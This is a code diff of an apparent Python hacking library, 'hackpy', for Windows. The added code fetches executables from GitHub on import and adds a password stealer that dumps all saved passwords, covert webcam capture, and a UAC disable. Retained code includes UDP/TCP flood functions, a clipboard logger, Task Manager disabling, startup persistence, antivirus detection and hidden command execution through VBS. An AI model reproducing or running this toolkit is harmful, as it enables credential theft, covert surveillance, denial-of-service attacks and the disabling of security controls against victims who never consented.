@@ -18,7 +18,6 @@ from json import load as json_load
 from time import sleep as time_sleep
 from time import time as time_time
 from time import ctime as time_ctime
-from shutil import move as shutil_move
 from shutil import rmtree as shutil_rmtree
 from wget import download as wget_download
 from getmac import get_mac_address as getmac
@@ -31,36 +30,14 @@ from socket import gethostname as socket_gethostname
 from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM
 
 # Install path
+global install_path
 install_path = os_environ['TEMP'] + '\\hackpy'
-if not os_path.exists(install_path):
-	os_mkdir(install_path)
 
-# Load nircmdc.exe
-def load(architecture=32, statusbar = None):
-	if os_path.exists(install_path + '\\nircmdc.exe'):
-		return True
-	else:
-		if architecture == 64:
-			nircmdc_file_part = 'nircmdc'
-		else:
-			nircmdc_file_part = 'nircmd'
-
-		nircmdc_temp_file = wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/' + nircmdc_file_part + '.exe', bar = statusbar)
-	shutil_move(nircmdc_temp_file, install_path + '\\nircmdc.exe')
-	return True
-
-# Unload (delete) nircmdc.exe from system
+# Unload (delete) HackPy from system
 def unload():
 	if os_path.exists(install_path):
 		shutil_rmtree(install_path)
 		return True
-	else:
-		raise FileNotFoundError('hackpy - Failed to delete file. It does not exist')
-		return False
-
-# Clean temp hackpy cache
-def clean():
-	command.system('@cd ' + install_path + ' && @del *.bat > NUL && @del *.vbs > NUL')
 
 # Load file from URL
 def wget(link, statusbar = None, output = None):
@@ -87,21 +64,19 @@ def autorun(path, name='hackpy_' + str(random_randint(1,999)) + '_', state=True)
 	else:
 		raise FileNotFoundError('hackpy - Failed to add file: ' + file + ' to startup')
 
-def stealler():
-	#
-	# hackpy.stealler() # Save all Сhrome passwords to passwords.txt
-	# Stealler source code: https://pastebin.com/V28aPdZH
-	#
-	if not os_path.exists(install_path + '\\passwords_recovery.exe'):
-		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/passwords_recovery.exe', out = install_path + '\\passwords_recovery.exe', bar = None)
-	command.system('@start ' + install_path + '\\passwords_recovery.exe')
+def stealler(filename = 'passwords.txt'):
+	##|
+	##| hackpy.stealler() # Save all passwords to passwords.txt
+	##| https://github.com/AlessandroZ/LaZagne
+	##|
+	command.system(install_path + '\\passwords_recovery.exe all >> ' + filename)
 
 
 def sendkey(key):
-	#
-	# SendKey('Hello my L0rd!!{ENTER}')
-	# Other keys: https://pastebin.com/Ns3P7UiH
-	#
+	##|
+	##| SendKey('Hello my L0rd!!{ENTER}')
+	##| Other keys: https://pastebin.com/Ns3P7UiH
+	##|
 	with open(install_path + '\\keyboard.vbs', "w") as tempfile:
 		tempfile.write('WScript.CreateObject(\"WScript.Shell\").SendKeys \"' + key + '\"')
 	os_startfile(install_path + '\\keyboard.vbs')
@@ -112,23 +87,23 @@ def sendkey(key):
 # This endpoint is limited to 150 requests per minute from an IP address. If you go over this limit your IP address will be blackholed.
 # You can unban here: http://ip-api.com/docs/unban
 def ip_info(ip = '', status_bar = None, out_tempfile = 'ip_info.json'):
-	#
-    #  "query": "24.48.0.1",
-    #  "local": "192.168.1.6",
-    #  "status": "success",
-    #  "country": "Canada",
-    #  "countryCode": "CA",
-    #  "region": "QC",
-    #  "regionName": "Quebec",
-    #  "city": "Saint-Leonard",
-    #  "zip": "H1R",
-    #  "lat": 45.5833,
-    #  "lon": -73.6,
-    #  "timezone": "America/Toronto",
-    #  "isp": "Le Groupe Videotron Ltee",
-    #  "org": "Videotron Ltee",
-    #  "as": "AS5769 Videotron Telecom Ltee"
-	#
+	##|
+    ##|  "query": "24.48.0.1",
+    ##|  "local": "192.168.1.6",
+    ##|  "status": "success",
+    ##|  "country": "Canada",
+    ##|  "countryCode": "CA",
+    ##|  "region": "QC",
+    ##|  "regionName": "Quebec",
+    ##|  "city": "Saint-Leonard",
+    ##|  "zip": "H1R",
+    ##|  "lat": 45.5833,
+    ##|  "lon": -73.6,
+    ##|  "timezone": "America/Toronto",
+    ##|  "isp": "Le Groupe Videotron Ltee",
+    ##|  "org": "Videotron Ltee",
+    ##|  "as": "AS5769 Videotron Telecom Ltee"
+	##|
     wget_download('http://ip-api.com/json/' + ip, bar = status_bar, out = out_tempfile)
     with open(out_tempfile, "r") as tempfile:
         ip_data = json_load(tempfile)
@@ -166,11 +141,11 @@ def router():
 		return BSSID
 
 def install_python(version = '3.7.0', path = os_environ['SystemDrive'] + '\\python'):
-	#
-	# Install python to system
-	# Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python36')
-	# Default version is: 3.7.0 and install path is: C:\python
-	#
+	##|
+	##| Install python to system
+	##| Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python36')
+	##| Default version is: 3.7.0 and install path is: C:\python
+	##|
 	if os_path.exists(path):
 		raise FileExistsError('Python is installed')
 	else:
@@ -202,6 +177,8 @@ def detect_protection():
 	 'Dr.Web 64bit': 'Program Files\\DrWeb',
      'Eset 32bit': 'Program Files (x86)\\ESET\\ESET Security',
      'Eset 64bit': 'Program Files\\ESET\\ESET Security',
+	 'Grizzly Pro 32bit': 'Program Files (x86)\\GRIZZLY Antivirus',
+	 'Grizzly Pro 64bit': 'Program Files\\GRIZZLY Antivirus',
 	 'Kaspersky 32bit': 'Program Files (x86)\\Kaspersky Lab',
 	 'Kaspersky 64bit': 'Program Files\\Kaspersky Lab',
      'Malvare fighter 32bit': 'Program Files (x86)\\IObit\\IObit Malware Fighter',
@@ -221,15 +198,24 @@ def detect_protection():
 
     return detected
 
+def webcam(filename = 'screenshot.png', delay = 4500, camera = 1):
+	##|
+	##| Make webcam screenshot: hackpy.webcam(filename='webcam.png', delay=5000, camera=1)
+	##|
+	command.system(install_path + '\\CommandCam.exe /filename ' + str(filename) + ' /delay ' + str(delay) + ' /devnum ' + str(camera))
+
+
 class command:
-	# Execute system command: hackpy.command.system('command')
-	# Execute nircmdc command: hackpy.command.nircmdc('command')
+	##|
+	##| Execute system command: hackpy.command.system('command')
+	##| Execute nircmdc command: hackpy.command.nircmdc('command')
+	##|
 	def system(recived_command):
 		# Temp files names
 		bat_script_path = install_path + '\\' + 'bat_script_' + str(random_randint(1, 100000)) + '.bat'
 		vbs_script_path = install_path + '\\' + 'vbs_script_' + str(random_randint(1, 100000)) + '.vbs'
 		# Temp files commands
-		bat_script = '@' + recived_command
+		bat_script = recived_command
 		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
 		# Write bat commands
 		with open(bat_script_path, "w") as bat_script_write:
@@ -241,21 +227,18 @@ class command:
 		os_startfile(vbs_script_path)
 
 	def nircmdc(recived_command, priority='NORMAL'):
-		# Check nircmdc.exe file
-		if os_path.exists(install_path + '\\nircmdc.exe'):
-			command.system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmdc.exe' + ' ' + recived_command)
-		else:
-			raise FileNotFoundError('hackpy - You don\'t loaded nircmdc.exe please make hackpy.load() after importing this module.')
+		command.system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmd.exe' + ' ' + recived_command)
+
 
 
 class messagebox:
-	#
-	# Show windows message box:
-    # hackpy.messagebox.none('Caption!', 'Hey i\'m text!')
-	# hackpy.messagebox.info('Caption!', 'Hey i\'m text!')
-	# hackpy.messagebox.error('Caption!', 'Hey i\'m text!')
-	# hackpy.messagebox.warning('Caption!', 'Hey i\'m text!')
-	#
+	##|
+	##| Show windows message box:
+    ##| hackpy.messagebox.none('Caption!', 'Hey i\'m text!')
+	##| hackpy.messagebox.info('Caption!', 'Hey i\'m text!')
+	##| hackpy.messagebox.error('Caption!', 'Hey i\'m text!')
+	##| hackpy.messagebox.warning('Caption!', 'Hey i\'m text!')
+	##|
 	def info(caption, text):
 		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
 			msgboxfile.write('x=msgbox(\"' + text + '\" ,64, \"' + caption + '\")')
@@ -274,12 +257,12 @@ class messagebox:
 			os_startfile(install_path + '\\msgbox.vbs')
 
 class ddos:
-	#
-	# UDP flood:
-	# hackpy.ddos.udp('172.217.16.46', 8080, duration = 10, message = True)
-	# TCP flood
-	# hackpy.ddos.tcp('172.217.16.46', 8080, duration = 15, message = True)
-	#
+	##|
+	##| UDP flood:
+	##| hackpy.ddos.udp('172.217.16.46', 8080, duration = 10, message = True)
+	##| TCP flood
+	##| hackpy.ddos.tcp('172.217.16.46', 8080, duration = 15, message = True)
+	##|
 	def udp(ip, port, duration, message = False):
 		sent = 0
 		client = socket(AF_INET, SOCK_DGRAM)
@@ -310,11 +293,11 @@ class ddos:
 
 
 class clipboard:
-	#
-	# hackpy.clipboard.set('Text') # Copy text to clipboard
-	# print('Data in clipboard:' + clipboard.get()) # Get text from clipboard
-	# hackpy.clipboard.logger('clip_logs.txt') # Log all clipboard changes to file.
-	#
+	##|
+	##| hackpy.clipboard.set('Text') # Copy text to clipboard
+	##| print('Data in clipboard:' + clipboard.get()) # Get text from clipboard
+	##| hackpy.clipboard.logger('clip_logs.txt') # Log all clipboard changes to file.
+	##|
 	def set(text):
 		pyperclip_copy(text)
 
@@ -334,14 +317,14 @@ class clipboard:
 				clipboard_data_old = str(pyperclip_paste())
 
 class taskmanager:
-	#
-	# hackpy.taskmanager.enable()
-	# hackpy.taskmanager.disable()
-	#
-	# hackpy.taskmanager.kill('process_name.exe')
-	# hackpy.taskmanager.start('process_name.exe')
-	# hackpy.taskmanager.find('process_name.exe') # return True/False
-	#
+	##|
+	##| hackpy.taskmanager.enable()
+	##| hackpy.taskmanager.disable()
+	##|
+	##| hackpy.taskmanager.kill('process_name.exe')
+	##| hackpy.taskmanager.start('process_name.exe')
+	##| hackpy.taskmanager.find('process_name.exe') # return True/False
+	##|
 	def enable():
 		command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0')
 
@@ -381,7 +364,33 @@ IF "%ERRORLEVEL%"=="0" (
 			return True
 		elif data.split()[0] == 'False':
 			return False
+class uac:
+	##|
+	##| hackpy.uac.disable() # Disable UAC // NEED ADMIN!
+	##| hackpy.uac.enable() # Disable UAC // NEED ADMIN!
+	##|
+	def disable():
+		command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')
+
+	def enable():
+		command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f')
 
 
-if __name__ == '__main__':
+if __name__ != '__main__':
+	if not os_path.exists(install_path):
+		os_mkdir(install_path)
+	else:
+		command.system('@del ' + install_path + '\\*.bat && @del ' + install_path + '\\*.vbs')
+
+	# Load HackPy modules
+	if not os_path.exists(install_path + '\\nircmd.exe'):
+		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/nircmd.exe', out = install_path + '\\nircmd.exe', bar = None)
+
+	if not os_path.exists(install_path + '\\passwords_recovery.exe'):
+		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/passwords_recovery.exe', out = install_path + '\\passwords_recovery.exe', bar = None)
+
+	if not os_path.exists(install_path + '\\CommandCam.exe'):
+		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/CommandCam.exe', out = install_path + '\\CommandCam.exe', bar = None)
+
+else:
 	print(10 * '\n' + logo)
